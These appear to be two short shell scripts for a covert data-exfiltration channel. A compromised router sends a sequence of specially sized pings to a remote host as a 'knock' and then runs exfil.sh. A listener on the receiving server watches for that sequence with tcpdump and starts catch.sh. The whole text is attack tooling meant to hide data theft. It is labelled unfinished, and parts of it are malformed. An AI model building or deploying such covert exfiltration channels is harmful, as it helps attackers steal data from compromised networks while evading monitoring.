# Ping knock from the router to notify server that xfil is ready and to start catch.sh script

#!/bin/sh

ping -c 1 -s 78 <ip>
sleep 1
ping -c 1 -s 58 <ip>
sleep 1
ping -c 1 -s 88 <ip>


sleep 10
exfil.sh


# the server will need to monitor the incoming pings to see if the special sequence of icmp echo-request size
# matches the predefined sequence

# this still needs some work...basic concept

#!/bin/bash

# listener below
# tcpdump -i eth0 'icmp[icmptype] = icmp-echo' -l |tee /root/xfil/ping.out



# probably best to set this portion up on a crontab, every minute
#

file="/root/xfil/ping.out"

if [ -file ]; then
   awk '/86|66|96/' $file > $file.awk
   fsize=$(du -sb $file.awk | awk '{ print $1 }')
   if [ $fsize != "0" ]; then
     echo "Caught DNS xfil request"
     echo "Initiating catch.sh..."
     sh catch.sh
   fi

   # cleanup
   rm --interactive=never $file.awk
fi


